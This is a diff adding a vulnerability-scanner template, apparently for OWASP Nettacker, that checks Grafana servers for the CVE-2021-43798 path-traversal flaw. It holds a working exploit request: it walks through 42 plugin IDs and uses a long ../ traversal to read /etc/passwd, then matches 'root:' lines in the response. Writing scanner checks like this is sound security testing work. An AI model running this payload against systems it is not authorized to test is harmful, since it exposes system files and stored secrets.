@@ -1,0 +1,93 @@
+info:
+  name: grafana_cve_2021_43798_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description:  Grafana unpatched 0 Day LFI is now being actively exploited, it affects only Grafana 8.0+, Vulnerable companies should revoke the secrets they store at their /etc/grafana/grafana.ini as there is no official fix in the meantime.
+  reference: 
+    - https://nosec.org/home/detail/4914.html
+    - https://github.com/jas502n/Grafana-VulnTips
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - grafana
+    - lfi
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              plugin-id:
+                - alertlist
+                - annolist
+                - barchart
+                - bargauge
+                - cloudwatch
+                - dashlist
+                - elasticsearch
+                - gauge
+                - geomap
+                - gettingstarted
+                - grafana-azure-monitor-datasource
+                - grafana-clock-panel
+                - grafana-simple-json-datasource
+                - graph
+                - graphite
+                - heatmap
+                - histogram
+                - influxdb
+                - jaeger
+                - logs
+                - loki
+                - mssql
+                - mysql
+                - news
+                - nodeGraph
+                - opentsdb
+                - piechart
+                - pluginlist
+                - postgres
+                - prometheus
+                - stackdriver
+                - stat
+                - state-timeline
+                - status-history
+                - table
+                - table-old
+                - tempo
+                - testdata
+                - text
+                - timeseries
+                - welcome
+                - zipkin
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: "root:(\\S+):"
+              reverse: false
